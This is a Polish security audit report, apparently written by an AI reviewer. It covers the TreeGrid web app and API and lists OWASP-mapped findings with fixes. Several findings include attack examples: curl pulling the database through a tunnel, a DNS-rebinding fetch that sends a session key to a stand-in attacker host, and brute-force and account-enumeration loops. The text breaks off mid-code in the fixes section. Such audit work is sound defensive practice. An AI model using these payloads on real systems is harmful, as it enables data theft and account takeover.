# Raport audytu bezpieczeństwa kodu

**Data audytu:** 2026-09-25
**Audytor:** Claude (skill: owasp-code-review)
**Zakres:** TreeGrid — widok React Router SSR (`app/`), API ASP.NET Core + SQLite (`src/Api/`), konfiguracja oraz skrypty wystawienia (`.claude/skills/run-tunel-app/scripts/`, `buduj_app_dev.ps1`, `Dockerfile`)
**Wersja analizowanego kodu:** gałąź `feature/ovasp-code-review`, HEAD `d4fbfa6` (drzewo robocze bez zmian w kodzie aplikacji)
**Katalogi referencyjne:** OWASP Top 10:2025 (Web), OWASP API Security Top 10:2023. OWASP Top 10 for LLM Applications 2025 i OWASP Mobile Top 10:2024 — nie dotyczą (brak integracji z LLM, brak aplikacji mobilnej).

---

## 1. Podsumowanie wykonawcze

Zbadano całą aplikację TreeGrid — część widoczną w przeglądarce, serwer API z bazą danych oraz skrypty, którymi aplikacja jest wystawiana do internetu przez tunel Cloudflare. Fundamenty są solidne: każdy użytkownik widzi wyłącznie swoje drzewa i ekrany, zapytania do bazy są bezpieczne, a formularze są chronione przed podszywaniem się obcych stron. Znaleziono jednak trzy problemy wysokiej wagi. Pierwszy: tryb deweloperski tunelu najpewniej udostępnia każdemu, kto zna adres, cały katalog projektu razem z plikiem bazy (hasła w postaci skrótów, dane wszystkich użytkowników). Drugi: złośliwa strona otwarta w przeglądarce na komputerze-serwerze może odczytać klucz podpisu sesji. Trzeci: kod rejestracyjny — jedyna bariera przed założeniem konta — można zgadywać bez żadnego limitu. Aplikacja nadaje się do dalszego udostępniania w trybie produkcyjnym po wdrożeniu poprawek F-002 i F-003 (kilka linii konfiguracji i kodu); trybu deweloperskiego tunelu nie należy używać, dopóki F-001 nie zostanie zamknięte.

## 2. Statystyka znalezisk

| Severity   | Liczba |
|------------|--------|
| 🔴 Critical | 0 |
| 🟠 High     | 3 |
| 🟡 Medium   | 5 |
| 🔵 Low      | 2 |
| ⚪ Info     | 3 |
| **Razem**  | **13** |

**Łączna szacowana praca naprawcza:** ok. 4–6 osobodni (orientacyjnie; F-002 i F-003 to łącznie < 1 dzień, najwięcej zajmą F-005, F-006 i F-008).

## 3. Zakres i założenia analizy

**Co zostało zaudytowane:**
- `app/` — trasy (`app/routes/*.tsx|ts`), rejestr tras `app/routes.ts`, brama `app/routes/chronione.tsx`, klienci API `app/lib/*.server.ts`, logika widoku `app/lib/drzewo.ts`, `app/lib/ekran.ts`, komponenty formularzy i gridu, `app/root.tsx`, `app/entry.server.tsx`, motyw (`app/theme/zmienne.ts`, `app/theme/ciasteczko.ts`).
- `src/Api/` — `Program.cs`, obszary `Auth`, `Objects`, `Categories`, `Tree`, `Screens`, `Errors`, `Data` (encje i `AppDbContext`); bez treści `Migrations/`.
- Konfiguracja: `react-router.config.ts`, `vite.config.ts`, `package.json`, `package-lock.json`, `src/Api/Api.csproj`, `src/Api/appsettings*.json`, `global.json`, `.config/dotnet-tools.json`, `.gitignore`, `.dockerignore`, `Dockerfile`.
- Skrypty: `.claude/skills/run-tunel-app/scripts/start-prod-tunnel.ps1`, `start-tunnel.ps1`, `start-api.ps1`, `buduj_app_dev.ps1`.
- Skan zależności: `npm audit` (lockfile) i `dotnet list package --vulnerable --include-transitive` (wynik w Dodatku A).

**Czego NIE zaudytowano (i dlaczego):**
- `tests/Api.Tests/` — nie jest powierzchnią ataku.
- Treść migracji EF (`src/Api/Migrations/`) — kod generowany; schemat oceniono przez `AppDbContext.cs`.
- Konfiguracja Cloudflare (edge, TLS) — poza repozytorium; quick tunnel nie daje konfiguracji WAF ani Access.
- Wnętrze bibliotek (React Router, antd, ASP.NET Core Identity) — poza zachowaniem Vite 8.3.0 potrzebnym do F-001, sprawdzonym w źródłach pakietu.
- Wartości sekretów (`user-secrets`, `Auth__*`) — świadomie nieodczytywane.

**Założenia analizy:**
- Aplikacja działa zgodnie z `CLAUDE.md`: Node na `127.0.0.1:3000` za Cloudflare Quick Tunnel, API wyłącznie na `127.0.0.1:5180`, maszyna-serwer jest jednocześnie stacją roboczą operatora (self-hosting).
- Przyjęte decyzje architektoniczne (nagłówek `X-TreeGrid-User`, nieuwierzytelniony `/internal/session-signing-key`, wildcard `*.trycloudflare.com` w `allowedActionOrigins`, wspólne słowniki obiektów i kategorii) traktowano jako **niezmienniki do sprawdzenia**, nie jako luki. Znaleziskiem jest złamanie warunku, na którym decyzja stoi, albo nazwane ryzyko resztkowe (F-002). Wynik każdego niezmiennika — Dodatek A.3.
- Model dostępu według `context/foundation/prd.md:118-120`: płaski, bez ról; drzewa i ekrany prywatne, słowniki wspólne.

**Czego analiza statyczna nie wykryje (rekomendowane dalsze działania):**
- Audyt jest **wyłącznie statyczny** — aplikacji, API ani tunelu nie uruchamiano. Nagłówki odpowiedzi, flagi ciasteczek w runtime i F-001 wymagają potwierdzenia testem dynamicznym (checklista w sekcji 7).
- Race conditions pod realnym obciążeniem → testy obciążeniowe (szczególnie F-006: blokada zapisu SQLite).
- Nadużycia logiki biznesowej (API6:2023) → modelowanie zagrożeń per przepływ.
- Podatności runtime → DAST (OWASP ZAP) na adres tunelu.

## 4. Znaleziska

> Posortowane od najwyższej severity. Poprawiony kod — sekcja 5. Żadne znalezisko nie zostało naprawione w repozytorium: zmiana `owasp-cr` jest wyłącznie raportowa.

---

### 🟠 [F-001] Tryb deweloperski tunelu wystawia do internetu pliki projektu, w tym bazę SQLite

- **Severity:** High
- **Kategoria OWASP:** A02:2025 Security Misconfiguration; A01:2025 Broken Access Control (ominięcie bramy sesji); API8:2023 Security Misconfiguration
- **Lokalizacja:** `vite.config.ts:5-10`, `.claude/skills/run-tunel-app/scripts/start-tunnel.ps1:187-188`; kontekst: `buduj_app_dev.ps1:214-217` (kopie bazy), `app/routes.ts:50-52`, `src/Api/Errors/ApiErrorHandling.cs:25`, `:44-46`
- **Status fixu:** ✅ Proponowany w sekcji 5 (wymaga potwierdzenia testem dynamicznym)

**Opis:**
`start-tunnel.ps1` kieruje publiczny Cloudflare Quick Tunnel na serwer deweloperski Vite (`:5173`), a skill `run-tunel-app` dopisuje adres tunelu do `server.allowedHosts`, więc Vite przyjmuje żądania z internetu. Serwer deweloperski Vite 8.3.0 (wersja z `package-lock.json:4061-4062`) rejestruje `serveStaticMiddleware`, który serwuje **każdy plik spod katalogu głównego projektu** (`vite/dist/node/chunks/node.js:17431-17459`), zanim żądanie dotrze do handlera React Routera — czyli zanim zadziała brama sesji z `chronione.tsx`. Domyślna lista `server.fs.deny` obejmuje wyłącznie `.env*`, klucze/certyfikaty, `.npmrc`, `.yarnrc.yml` i `.git` (`node.js:24631-24638`); `vite.config.ts` jej nie rozszerza. Plik bazy `src/Api/db/treegrid.db` leży w katalogu projektu. Skutek: każdy, kto zna adres tunelu, pobiera bez logowania bazę z hashami haseł i drzewami wszystkich użytkowników, kopie bazy z `buduj_app_dev.ps1`, logi `.tunnel-run/` i pełne źródła. Dodatkowo w tym trybie publiczny jest wzornik (`app/routes.ts:50-52`), a API uruchomione w Development zwraca treść wyjątków (`ApiErrorHandling.cs:25`, `:44-46`). Klasyfikacja High, nie Critical: wymaga uruchomienia trybu deweloperskiego tunelu i znajomości losowego adresu; ścieżka produkcyjna (`start-prod-tunnel.ps1`, build + `react-router-serve`) tego problemu nie ma.

**Dowód (proof):**
```ts
// vite.config.ts — brak server.fs.deny / server.fs.allow
5  export default defineConfig({
6    plugins: [tailwindcss(), reactRouter()],
7    resolve: {
8      tsconfigPaths: true,
9    },
10 });
```
```powershell
# start-tunnel.ps1
187 $tunnelProc = Start-Process -FilePath $cloudflared `
188     -ArgumentList 'tunnel', '--protocol', 'http2', '--url', "http://localhost:$Port" `
```

**Przykładowy payload / scenariusz ataku:**
`curl -o db.sqlite https://<adres>.trycloudflare.com/src/Api/db/treegrid.db` → lokalny `sqlite3 db.sqlite "select Email, PasswordHash from AspNetUsers"` i offline'owe łamanie hashy.

**Rekomendacja:**
Zablokować w `vite.config.ts` serwowanie katalogów spoza frontendu (`src/Api/**`, `*.db*`, `.tunnel-run/**`, `.claude/**`, `context/**`), a do czasu weryfikacji nie używać trybu deweloperskiego tunelu na maszynie z prawdziwą bazą.

---

### 🟠 [F-002] DNS rebinding: API bez filtra `Host` wydaje klucz podpisu sesji stronie otwartej na maszynie-serwerze

- **Severity:** High
- **Kategoria OWASP:** A01:2025 Broken Access Control; A02:2025 Security Misconfiguration; A04:2025 Cryptographic Failures (ujawnienie klucza); API8:2023 Security Misconfiguration
- **Lokalizacja:** `src/Api/appsettings.json:28`; `src/Api/Auth/AuthEndpoints.cs:33`, `:199-205`; `src/Api/Objects/ObjectEndpoints.cs:40-43`; `src/Api/Categories/CategoryEndpoints.cs:44-47`; `src/Api/Tree/TreeIdentity.cs:23-39`
- **Status fixu:** ✅ Proponowany w sekcji 5

**Opis:**
Model zaufania API (`TreeIdentity.cs:23-39`, `AuthEndpoints.cs:188-197`) zakłada, że skoro Kestrel słucha tylko na `127.0.0.1:5180`, do API dochodzą wyłącznie procesy tej maszyny. Przeglądarka operatora **jest** procesem tej maszyny — a przy self-hostingu serwer jest zwykłą stacją roboczą. `AllowedHosts: "*"` sprawia, że Kestrel przyjmuje dowolny nagłówek `Host`, więc działa klasyczny DNS rebinding: strona `http://atak.example:5180` po przełączeniu rekordu DNS na `127.0.0.1` jest dla przeglądarki tym samym originem co API. Może wtedy (1) odczytać `GET /internal/session-signing-key` — klucz, którym da się podpisać dowolną sesję (`lessons.md`, „Sekrety…”: najwyższa stawka w aplikacji), (2) czytać, zmieniać i usuwać wspólne słowniki bez tożsamości, (3) ustawić sam `X-TreeGrid-User`. To nie jest złamanie żadnego z trzech zapisanych warunków (Kestrel, tunel, trasy zasobowe są poprawne — Dodatek A.3), tylko ryzyko resztkowe, którego te warunki nie pokrywają. Łagodzenie: potrzebna wizyta operatora na złośliwej stronie w przeglądarce na maszynie-serwerze; Chrome od wersji z Local Network Access pyta o zgodę na dostęp do sieci lokalnej, Firefox i Safari nie dają porównywalnej ochrony. Do podrobienia sesji konkretnego konta potrzebny jest jeszcze jego identyfikator (GUID), więc skutek natychmiastowy to wyciek klucza i zapis słowników; rotacja klucza jest jedyną naprawą po fakcie.

**Dowód (proof):**
```json
// src/Api/appsettings.json
28  "AllowedHosts": "*"
```
```csharp
// src/Api/Auth/AuthEndpoints.cs
33        app.MapGet(SessionSigningKeyPath, GetSessionSigningKey);
...
199    private static IResult GetSessionSigningKey(HttpContext context, AuthSecrets secrets)
200    {
201        // Klucz nie ma prawa osiąść w żadnym buforze po drodze.
202        context.Response.Headers.CacheControl = "no-store";
203
204        return Results.Ok(new { key = secrets.RequireSessionSigningKey() });
205    }
```

**Przykładowy payload / scenariusz ataku:**
Strona na `atak.example:5180` (TTL rekordu DNS = 1 s) po rebindingu wykonuje `fetch("/internal/session-signing-key").then(r => r.json()).then(k => navigator.sendBeacon("https://atak.example/k", k.key))`.

**Rekomendacja:**
Ustawić `AllowedHosts` na `127.0.0.1;localhost` — `HostFilteringMiddleware` odrzuci wtedy każde żądanie z obcym nagłówkiem `Host` kodem 400, a serwer React Routera (wysyłający `Host: 127.0.0.1:5180`) działa bez zmian.

---

### 🟠 [F-003] Kod rejestracyjny można zgadywać bez limitu, a jego długość nie jest wymuszana

- **Severity:** High
- **Kategoria OWASP:** A07:2025 Authentication Failures; API4:2023 Unrestricted Resource Consumption; API6:2023 Unrestricted Access to Sensitive Business Flows
- **Lokalizacja:** `src/Api/Auth/AuthEndpoints.cs:45-100` (zwłaszcza `:80`); `src/Api/Auth/AuthSecrets.cs:64-83` (brak progu dla kodu, `:68-71`); `src/Api/Program.cs:74-200` (brak `AddRateLimiter`/`UseRateLimiter`)
- **Status fixu:** ✅ Proponowany w sekcji 5

**Opis:**
Za tunelem `trycloudflare.com` nie działa Cloudflare Access (`CLAUDE.md`, „Wdrożenie”), więc kod rejestracyjny jest jedyną barierą między dowolnym gościem a kontem w aplikacji. `POST /auth/register` porównuje kod w stałym czasie (dobrze — chroni przed pomiarem czasu), ale nie ma żadnego ograniczenia liczby prób: blokada konta z Identity dotyczy tylko logowania, a w całym API nie ma rate limitera. Start aplikacji wymaga, żeby kod był niepusty, ale — inaczej niż dla klucza podpisu (`AuthSecrets.cs:77`, 32 znaki) — nie wymusza żadnej długości. Krótki kod (np. 6 cyfr) pada w godziny skryptem przez publiczny adres. Skutek założenia konta: dostęp do wszystkich widoków, możliwość modyfikacji i usuwania **wspólnych** słowników wszystkich użytkowników oraz punkt wyjścia do F-006. Sklasyfikowano jako High (wątpliwość High/Medium rozstrzygnięta w górę): to pełne ominięcie jedynej kontroli dostępu do rejestracji, bez żadnej warstwy opóźniającej.

**Dowód (proof):**
```csharp
// src/Api/Auth/AuthSecrets.cs — kod rejestracyjny: tylko „niepusty”
68        if (string.IsNullOrWhiteSpace(RegistrationCode))
69        {
70            problems.Add(MissingMessage(RegistrationCodeKey));
71        }
```
```csharp
// src/Api/Auth/AuthEndpoints.cs — brak limitu prób
31        app.MapPost("/auth/register", RegisterAsync);
...
80        if (!FixedTimeMatches(secrets.RequireRegistrationCode(), registrationCode))
```

**Przykładowy payload / scenariusz ataku:**
Pętla `POST https://<adres>.trycloudflare.com/rejestracja` z polami `email`, `password`, `registrationCode=000000…999999` i nagłówkiem `Origin` równym adresowi tunelu (przechodzi `requireSameOrigin`, bo to ten sam host).

**Rekomendacja:**
Globalny limiter na `/auth/register` w API (np. 5 prób / 10 min) z odpowiedzią 429 w kontrakcie błędów oraz minimalna długość kodu rejestracyjnego (np. 16 znaków) sprawdzana przy starcie.

---

### 🟡 [F-004] Logowanie chroni wyłącznie blokada per konto — brak limitu tempa, enumeracja przez 423

- **Severity:** Medium
- **Kategoria OWASP:** A07:2025 Authentication Failures; API2:2023 Broken Authentication; API4:2023
- **Lokalizacja:** `src/Api/Auth/AuthEndpoints.cs:117-181` (zwłaszcza `:141-173`); `src/Api/Program.cs:56-62`; `src/Api/appsettings.json:12-17`
- **Status fixu:** ✅ Proponowany w sekcji 5 (wspólny fix z F-003)

**Opis:**
Blokada konta (5 prób / 15 min) jest poprawnie zaimplementowana i obejmuje nowe konta, ale jest jedyną warstwą. (1) Password spraying: atakujący próbuje 4 popularnych haseł na każdym znanym adresie e-mail co 15 minut i nigdy nie wyzwala blokady; brak globalnego limitu i brak limitu per źródło. (2) Enumeracja kont: dla nieistniejącego adresu odpowiedź to zawsze 401, dla istniejącego piąta błędna próba daje 423 `account_locked` z `lockoutEnd` — istnienie konta da się więc potwierdzić (kosztem zablokowania ofiary). Kod sam odnotowuje też kanał czasowy (`:145-149`: brak liczenia hasha dla nieistniejącego konta). (3) Blokada jako DoS: znając adres e-mail dyspozytora, można go trzymać w blokadzie w nieskończoność. Medium zgodnie ze skalą skilla („brak rate limitingu na loginie”).

**Dowód (proof):**
```csharp
// src/Api/Auth/AuthEndpoints.cs
143        if (user is null)
144        {
...
150            return LoginFailureResult(LoginOutcome.UserNotFound, lockoutEnd: null);
151        }
152
153        if (await userManager.IsLockedOutAsync(user))
154        {
155            return LoginFailureResult(
156                LoginOutcome.LockedOut,
157                await userManager.GetLockoutEndDateAsync(user));
```

**Przykładowy payload / scenariusz ataku:**
5 × `POST /logowanie` z `email=ofiara@firma.pl&password=x` → piąta odpowiedź 423 zamiast 401 potwierdza, że konto istnieje, i blokuje je na 15 minut; powtarzane co 15 minut utrzymuje blokadę.

**Rekomendacja:**
Globalny limiter przesuwny na `/auth/login` (sekcja 5, wspólnie z F-003); opcjonalnie limiter per `CF-Connecting-IP` po stronie Node. Enumerację przez 423 zaakceptować świadomie albo zwracać 401 także dla zablokowanego konta, a informację o blokadzie przekazywać dopiero po poprawnym haśle.

---

### 🟡 [F-005] Sesja nie wygasa po stronie serwera, a wylogowanie jej nie unieważnia

- **Severity:** Medium
- **Kategoria OWASP:** A07:2025 Authentication Failures; API2:2023 Broken Authentication
- **Lokalizacja:** `app/lib/session.server.ts:38-50`, `:120-141`; `app/lib/auth.server.ts:62-73`, `:118-148`
- **Status fixu:** ✅ Proponowany w sekcji 5

**Opis:**
Sesja to bezstanowe, podpisane ciasteczko z treścią `{ user: { id, email } }`, bez znacznika czasu wydania. Brak `maxAge`/`expires` jest świadomy (ciasteczko „do zamknięcia przeglądarki”) i sam w sobie poprawny, ale nie ogranicza ważności **wartości**: skopiowane ciasteczko `__session` (z logów proxy, zrzutu przeglądarki, współdzielonego komputera) pozostaje ważne bezterminowo — do rotacji `Auth:SessionSigningKey`, co wylogowuje wszystkich. `destroyUserSession` jedynie każe przeglądarce usunąć jej kopię. Zablokowanie konta nie kończy trwającej sesji, a dla tras słownikowych nawet usunięcie konta (API słowników nie sprawdza tożsamości). Za publicznym tunelem, gdzie logowanie aplikacji jest jedyną kontrolą dostępu, to zbyt długie okno. Flagi ciasteczka (`HttpOnly`, `Secure`, `SameSite=Lax`, brak `domain`) są poprawne.

**Dowód (proof):**
```ts
// app/lib/session.server.ts
48 type SessionContent = {
49   user: SessionUser;
50 };
...
137       // Brak `maxAge` i brak `expires` też jest świadomy — to jest zapis
138       // cyklu życia „do zamknięcia przeglądarki". Ustawienie któregokolwiek
139       // z tych pól, choćby na małą wartość, zamienia ciasteczko w trwałe.
```

**Przykładowy payload / scenariusz ataku:**
Ciasteczko przechwycone w poniedziałek działa w piątek, po wylogowaniu ofiary i po zablokowaniu jej konta.

**Rekomendacja:**
Zapisywać w sesji czas wydania i odrzucać w `getUser` sesje starsze niż ustalony limit bezwzględny (np. 12 h), zachowując ciasteczko sesyjne bez `maxAge`.

---

### 🟡 [F-006] Brak limitów zasobów: zapis ekranu materializuje węzły × kategorie bez górnej granicy, pod globalną blokadą SQLite

- **Severity:** Medium
- **Kategoria OWASP:** API4:2023 Unrestricted Resource Consumption; A06:2025 Insecure Design
- **Lokalizacja:** `src/Api/Screens/ScreenRules.cs:139-161`, `:187-198`; `src/Api/Screens/ScreenEndpoints.cs:130`, `:182-198`, `:410-431`; `src/Api/Tree/TreeEndpoints.cs:622-651`; `src/Api/Data/TreeNode.cs:28-32`; `src/Api/Objects/ObjectEndpoints.cs:76-78`, `:258-264`
- **Status fixu:** ⚠️ Wymaga decyzji produktowej (wartości progów — PRD Open Question 5); kod proponowany w sekcji 5

**Opis:**
Lista kategorii domyślnych ekranu jest sprawdzana tylko pod kątem „niepusta” i „bez powtórzeń” — bez górnego limitu. Zapis ekranu tworzy `węzły × K` rekordów (`Materialize`), przy drzewie do 2000 węzłów i słowniku kategorii, który każdy zalogowany może dowolnie rozbudować. Całość idzie w jednej transakcji otwartej na starcie żądania (`BEGIN IMMEDIATE` w Microsoft.Data.Sqlite), czyli pod jedyną blokadą zapisu bazy: inne zapisy czekają `busy_timeout` 5000 ms (`Program.cs:17`) i kończą się błędem. `PUT /screens/{id}` z tą samą listą w innej kolejności to „zmiana” (`ScreenRules.cs:171-172`) i przepisuje wszystko od nowa. Brak też limitów na konto: liczba drzew (limit 2000 jest per drzewo), ekranów, obiektów i kategorii w słowniku (każdy zapis obiektu wczytuje cały katalog w transakcji, `ObjectEndpoints.cs:76-78`). Warunek: atakujący musi mieć konto (patrz F-003), stąd Medium.

**Dowód (proof):**
```csharp
// src/Api/Screens/ScreenRules.cs
144        if (categoryIds.Count == 0)
...
151        if (categoryIds.Distinct().Count() != categoryIds.Count)
...            // brak górnego limitu
187    internal static IEnumerable<ScreenAssignment> Materialize(
...
191        foreach (var nodeId in nodeIds)
193            for (var position = 0; position < defaultCategoryIds.Count; position++)
```

**Przykładowy payload / scenariusz ataku:**
Utworzyć 1000 kategorii, drzewo z 2000 węzłów, a następnie ekran ze wszystkimi kategoriami domyślnymi → 2 mln encji w jednym `SaveChanges`, blokada zapisu dla wszystkich użytkowników; powtarzać `PUT` z permutacją listy.

**Rekomendacja:**
Górny limit długości listy kategorii (domyślnej i per węzeł), limit iloczynu węzły × kategorie na ekran oraz limity liczby drzew i ekranów na konto — w `ScreenRules`/`TreeRules`, z odmową 409 w kontrakcie błędów, tak jak istniejące `tree_too_large`.

---

### 🟡 [F-007] Brak logowania zdarzeń bezpieczeństwa

- **Severity:** Medium
- **Kategoria OWASP:** A09:2025 Logging & Alerting Failures
- **Lokalizacja:** `src/Api/Auth/AuthEndpoints.cs:45-181` (brak loggera); `src/Api/Program.cs:89`, `:119` (jedyne wywołania logowania); `src/Api/appsettings.json:22-27`; `app/lib/auth.server.ts:166-183`; `src/Api/Objects/ObjectEndpoints.cs:14-15`, `src/Api/Categories/CategoryEndpoints.cs:13-14`
- **Status fixu:** ✅ Proponowany w sekcji 5

**Opis:**
Jedyne wpisy logu API to dwa `LogCritical` przy starcie. Nieudane logowania, blokady kont, błędne kody rejestracyjne, odrzucenia `origin_mismatch` i odmowy 401 z `TreeIdentity` nie zostawiają śladu. Poziom `Microsoft.AspNetCore: Warning` wyłącza też log żądań. Po stronie Node `react-router-serve` loguje żądania, ale za tunelem źródłem każdego jest `127.0.0.1` — `CF-Connecting-IP` nie jest zapisywany. Zmiany we wspólnych słownikach nie są przypisywane do konta (API nie dostaje tożsamości). Trwający atak z F-003/F-004 jest więc niewidoczny, a incydentu nie da się odtworzyć. Medium: przy publicznym adresie i braku innych kontroli detekcja jest jedyną drogą do reakcji.

**Dowód (proof):**
```csharp
// src/Api/Auth/AuthEndpoints.cs — ścieżka błędnego hasła bez żadnego wpisu logu
160        if (!await userManager.CheckPasswordAsync(user, password))
161        {
162            await userManager.AccessFailedAsync(user);
```

**Przykładowy payload / scenariusz ataku:**
10 000 prób kodu rejestracyjnego w ciągu nocy nie zostawia w logach API żadnego wpisu.

**Rekomendacja:**
Strukturalne wpisy `Warning` dla zdarzeń uwierzytelniania (bez haseł i kodów), wpis dla `origin_mismatch` po stronie Node z `CF-Connecting-IP`, docelowo przekazanie tożsamości do endpointów słowników w celu audytu zmian.

---

### 🟡 [F-008] Brak nagłówków bezpieczeństwa w odpowiedziach HTML

- **Severity:** Medium
- **Kategoria OWASP:** A02:2025 Security Misconfiguration; API8:2023
- **Lokalizacja:** `app/entry.server.tsx:66-72`
- **Status fixu:** ✅ Proponowany w sekcji 5 (wariant minimalny; pełny CSP z nonce — sekcja 8)

**Opis:**
Ani `app/`, ani `src/Api/` nie ustawiają `Content-Security-Policy`, `X-Frame-Options`/`frame-ancestors`, `X-Content-Type-Options`, `Referrer-Policy` ani `Strict-Transport-Security`; `react-router-serve` i quick tunnel ich nie dokładają. Clickjacking zalogowanych widoków jest dziś w praktyce ograniczony: `trycloudflare.com` jest na Public Suffix List, więc obcy tunel jest cross-site i ciasteczko `SameSite=Lax` nie jedzie w jego ramce — ale nie dotyczy to stron na innych domenach otwartych w tej samej sesji przeglądarki, gdy użytkownik przejdzie do aplikacji najwyższym poziomem. Brak CSP odbiera obronę w głąb przed XSS, brak HSTS — przed pierwszym wejściem po HTTP. Medium według skali skilla („słabe nagłówki bezpieczeństwa”).

**Dowód (proof):**
```tsx
// app/entry.server.tsx — jedyny ustawiany nagłówek
66            responseHeaders.set("Content-Type", "text/html");
```

**Przykładowy payload / scenariusz ataku:**
`<iframe src="https://<adres>.trycloudflare.com/logowanie">` na obcej stronie renderuje formularz logowania w ramce (brak `frame-ancestors`).

**Rekomendacja:**
Ustawić w `entry.server.tsx` zestaw nagłówków niepsujących renderowania (`frame-ancestors`, `nosniff`, `Referrer-Policy`, HSTS, `base-uri`/`form-action`/`object-src`); pełną politykę `script-src` z nonce wprowadzić osobno.

---

### 🔵 [F-009] Szczegóły wewnętrzne w `context` błędu trafiają do przeglądarki

- **Severity:** Low
- **Kategoria OWASP:** A10:2025 Mishandling of Exceptional Conditions; A02:2025
- **Lokalizacja:** `app/lib/api.server.ts:192-201`, `:111-121`; `app/lib/auth.server.ts:202-211`; `app/routes/api.health.ts:32-41` (trasa publiczna); przekazywane m.in. przez `app/routes/obiekty.tsx`, `kategorie.tsx`, `drzewo.tsx`, `ekrany.tsx` (`data(…error…)`)
- **Status fixu:** ✅ Proponowany w sekcji 5

**Opis:**
Gdy API nie odpowiada, koperta błędu niesie w `context.reason` surowy komunikat `fetch` (np. `fetch failed: connect ECONNREFUSED 127.0.0.1:5180`) i wewnętrzną ścieżkę API. Widoki pokazują tylko `message`, ale cała koperta jest serializowana do danych strony (`loaderData`/`actionData`) i dostępna przez tunel; publiczne `/api/health` zwraca ją każdemu bez logowania. Ujawnia to topologię (port i ścieżki API), bez bezpośredniego skutku — port nie jest osiągalny z zewnątrz.

**Dowód (proof):**
```ts
// app/lib/api.server.ts
196       error: apiError(
197         ROUTE_ERROR_CODES.ApiUnreachable,
198         "Nie udało się połączyć z API aplikacji.",
199         { path, reason: describeCause(cause) },
```

**Rekomendacja:**
Logować `reason` po stronie serwera Node, a do `context` odpowiedzi wkładać wyłącznie `path` (albo nic).

---

### 🔵 [F-010] Kody słownika podatne na homoglify i znaki niewidoczne

- **Severity:** Low
- **Kategoria OWASP:** A06:2025 Insecure Design
- **Lokalizacja:** `src/Api/Data/DictionaryCode.cs:23`
- **Status fixu:** ✅ Proponowany w sekcji 5

**Opis:**
Normalizacja kodu to `Trim().ToUpperInvariant()` — bez normalizacji Unicode i bez odrzucania znaków formatujących (Cf) i sterujących (Cc). We wspólnym słowniku można więc założyć `GPZ‑01` (z nierozdzielającym łącznikiem U+2011) albo `GPZ-01` + U+200B, wizualnie identyczne z istniejącym `GPZ-01`, i skłonić innego dyspozytora do wybrania niewłaściwego obiektu. XSS wykluczony (React escapuje tekst).

**Dowód (proof):**
```csharp
23    internal static string Normalize(string code) => code.Trim().ToUpperInvariant();
```

**Rekomendacja:**
Normalizować NFKC i odrzucać znaki kategorii Cc/Cf w walidacji kodu (obiekty i kategorie).

---

### ⚪ [F-011] Reguła „ekran i drzewo mają tego samego właściciela” nie jest wymuszona w schemacie, a komentarz przeczy kodowi

- **Severity:** Info
- **Kategoria OWASP:** A01:2025 Broken Access Control (obrona w głąb); API1:2023 BOLA
- **Lokalizacja:** `src/Api/Data/Screen.cs:12-15`; `src/Api/Data/AppDbContext.cs:167-170`; `src/Api/Screens/ScreenEndpoints.cs:153`, `:371`
- **Status fixu:** ❌ Nie naprawiane w tej zmianie — rekomendacja w sekcji 8

**Opis:**
Kontrola własności drzewa przy tworzeniu (`:153`) i edycji ekranu (`:371`) jest poprawna i działa w transakcji. Kilka odczytów ufa jednak `screen.TreeId` bez filtra właściciela, a komentarz w `Screen.cs:12-15` twierdzi, że drzewo ekranu „się nie zmienia” — podczas gdy `PUT /screens/{id}` je zmienia. Opiekun, który zaufa komentarzowi, może usunąć kontrolę z `:371` i otworzyć odczyt cudzych węzłów. Rekomendacja: złożony klucz obcy `(TreeId, UserId) → Trees(Id, UserId)` i poprawka komentarza.

---

### ⚪ [F-012] Higiena łańcucha dostaw i obrazu kontenera

- **Severity:** Info
- **Kategoria OWASP:** A03:2025 Software Supply Chain Failures; A02:2025
- **Lokalizacja:** `Dockerfile:1-22`; `.dockerignore`; `src/Api/Api.csproj` (brak `packages.lock.json`); `.claude/skills/run-tunel-app/scripts/start-tunnel.ps1:188`; `app/root.tsx:43-62`
- **Status fixu:** ❌ Nie naprawiane — `Dockerfile` nie jest dziś ścieżką wdrożenia (`CLAUDE.md`)

**Opis:**
Obraz końcowy działa jako `root` (brak `USER node`), bazowy `node:24-alpine` nie jest przypięty skrótem, `.dockerignore` nie wyklucza `.env*`, `.git`, `.tunnel-run`, `.claude` (`COPY . /app` wciąga je do etapów budowania, choć nie do obrazu końcowego). NuGet nie ma pliku blokady z hashami (wersje są przypięte dokładnie). Tunel deweloperski nie ma `--no-autoupdate` (produkcyjny ma, `start-prod-tunnel.ps1:244`). Fonty z Google Fonts (`root.tsx:43-62`) wysyłają IP odwiedzających do strony trzeciej i nie mogą mieć SRI. Skan zależności npm i NuGet: 0 znanych podatności (Dodatek A.2).

---

### ⚪ [F-013] Utwardzenie uwierzytelniania — brak MFA, brak sprawdzania haseł z wycieków

- **Severity:** Info
- **Kategoria OWASP:** A07:2025 Authentication Failures
- **Lokalizacja:** `src/Api/Program.cs:44-64`; `src/Api/Auth/AuthEndpoints.cs:227-230`
- **Status fixu:** ❌ Nie naprawiane — poza zakresem MVP (PRD FR-001: e-mail + hasło)

**Opis:**
Polityka haseł: minimum 10 znaków plus domyślne reguły złożoności Identity; brak sprawdzania w listach wycieków (HIBP k-anonymity) i brak MFA. Parametry hashowania to domyślne `PasswordHasher` Identity v3 (PBKDF2) — warto porównać liczbę iteracji z bieżącą rekomendacją OWASP Password Storage Cheat Sheet (sprawdź w dokumentacji ASP.NET Core Identity dla .NET 10; opcja `PasswordHasherOptions.IterationCount`). `FixedTimeEquals` zwraca `false` natychmiast przy różnej długości — ujawnia wyłącznie długość kodu, co przy F-003 (limit prób) jest pomijalne.

## 5. Poprawiony kod

> **Kod poniżej jest propozycją — nie został zastosowany w repozytorium, nie był kompilowany ani testowany.** Zmiana `owasp-cr` jest wyłącznie raportowa; wdrożenie należy przeprowadzić osobną zmianą z pełną weryfikacją (`dotnet test`, `npm run typecheck`, checklista z sekcji 7). Pokazano zmienione fragmenty w stylu otaczającego kodu, nie całe pliki.

### Plik: `vite.config.ts`

**Dotyczy znalezisk:** F-001

```ts
import { reactRouter } from "@react-router/dev/vite";
import tailwindcss from "@tailwindcss/vite";
import { defineConfig } from "vite";

export default defineConfig({
  plugins: [tailwindcss(), reactRouter()],
  resolve: {
    tsconfigPaths: true,
  },
  server: {
    fs: {
      // F-001 (A02:2025): serwer deweloperski serwuje każdy plik spod katalogu
      // projektu, zanim żądanie dotrze do bramy sesji. Tryb tunelu
      // deweloperskiego wystawia go do internetu, więc katalogi spoza frontendu
      // muszą być zablokowane jawnie. Lista ZASTĘPUJE domyślną — pierwsze
      // pozycje to domyślne wpisy Vite 8, których nie wolno zgubić.
      deny: [
